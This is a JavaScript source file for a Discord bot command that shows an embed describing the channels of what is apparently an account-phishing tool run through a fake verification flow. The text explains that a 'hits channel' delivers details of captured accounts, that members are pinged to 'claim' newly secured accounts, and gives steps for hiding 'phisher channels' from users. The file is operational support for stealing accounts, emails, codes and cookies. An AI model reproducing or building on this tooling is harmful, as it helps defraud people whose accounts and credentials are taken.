const { EmbedBuilder } = require('discord.js');

module.exports = {
    name: "seechannels",
    callback: async (client, interaction) => {
        const embed = new EmbedBuilder()
            .addFields([
                {
                    name: 'Channels',
                    value:
                        `* **logs channel** → Shows the process the user is going through while verifying.\n` +
                        `* **hits channel** → Sends you the account details of secured accounts.\n` +
                        `* **users channel** → Displays the user verification process with hidden details (usernames, emails, codes, and cookie/status info are hidden).\n` +
                        `* **notification channel** → Notifies your users (with your selected ping in Claim settings) when a new account is secured, with options to view its stats or claim it.`
                },
                {
                    name: "How to hide your phisher channels?",
                    value: `1. Make all channels private or ensure the @everyone role cannot view them.\n` +
                           `2. To prevent bypasses from users who can see hidden channels:\n` +
                           `- Use \`/set\` to configure your phisher server where you want to send the embed.\n` +
                           `- Then set the other channels you need in a different server that your members can't access.`
                }
            ])
            .setColor(0xADD8E6);

        await interaction.reply({ embeds: [embed], ephemeral: true });
    }
};
